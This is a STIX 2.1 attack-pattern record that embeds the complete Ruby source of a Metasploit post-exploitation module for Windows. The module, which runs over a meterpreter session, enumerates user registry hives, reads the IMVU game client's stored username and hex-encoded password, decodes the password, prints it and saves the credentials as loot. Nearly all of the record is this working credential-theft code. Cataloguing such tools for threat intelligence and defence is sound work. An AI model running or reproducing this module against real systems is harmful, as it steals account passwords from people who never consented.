{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--0a6915c8-c287-462e-bcee-ea3f2a114887",
    "created": "2024-08-14T16:33:13.568955Z",
    "modified": "2024-08-14T16:33:13.568959Z",
    "name": "Windows Gather Credentials IMVU Game Client",
    "description": " This module extracts account username & password from the IMVU game client and stores it as loot. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/windows/gather/credentials/imvu.rb",
            "external_id": "imvu.rb"
        }
    ],
    "x_code_snippet": "# -*- coding: binary -*-\n\n##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::Windows::Registry\n  include Msf::Auxiliary::Report\n  include Msf::Post::Windows::UserProfiles\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Windows Gather Credentials IMVU Game Client',\n        'Description' => %q{\n          This module extracts account username & password from the IMVU game client\n          and stores it as loot.\n        },\n        'Author' => [\n          'Shubham Dawra <shubham2dawra[at]gmail.com>' # www.SecurityXploded.com\n        ],\n        'License' => MSF_LICENSE,\n        'Platform' => [ 'win' ],\n        'SessionTypes' => [ 'meterpreter' ]\n      )\n    )\n  end\n\n  def run\n    creds = Rex::Text::Table.new(\n      'Header' => 'IMVU Credentials',\n      'Indent' => 1,\n      'Columns' => [\n        'User',\n        'Password'\n      ]\n    )\n\n    credcount = 0\n    userhives = load_missing_hives\n    userhives.each do |hive|\n      next if hive['HKU'].nil?\n\n      vprint_status(\"Looking at Key #{hive['HKU']}\")\n      subkeys = registry_enumkeys(\"#{hive['HKU']}\\\\Software\\\\IMVU\\\\\")\n      if subkeys.nil? || subkeys.empty?\n        print_status('IMVU not installed for this user.')\n        next\n      end\n      user = registry_getvaldata(\"#{hive['HKU']}\\\\Software\\\\IMVU\\\\username\\\\\", '')\n      hpass = registry_getvaldata(\"#{hive['HKU']}\\\\Software\\\\IMVU\\\\password\\\\\", '')\n      decpass = [ hpass.downcase.gsub(/'/, '').gsub(/\\\\?x([a-f0-9][a-f0-9])/, '\\1') ].pack('H*')\n      print_good(\"User=#{user}, Password=#{decpass}\")\n      creds << [user, decpass]\n      credcount = (credcount + 1)\n    end\n\n    # clean up after ourselves\n    unload_our_hives(userhives)\n    print_status(\"#{credcount} Credentials were found.\")\n\n    if credcount > 0\n      print_status('Storing data...')\n      path = store_loot(\n        'imvu.user.creds',\n        'text/csv',\n        session,\n        creds.to_csv,\n        'imvu_user_creds.csv',\n        'IMVU User Credentials'\n      )\n      print_good(\"IMVU user credentials saved in: #{path}\")\n    end\n  end\nend\n",
    "x_mitre_platforms": [
        "[ 'win' ]"
    ]
}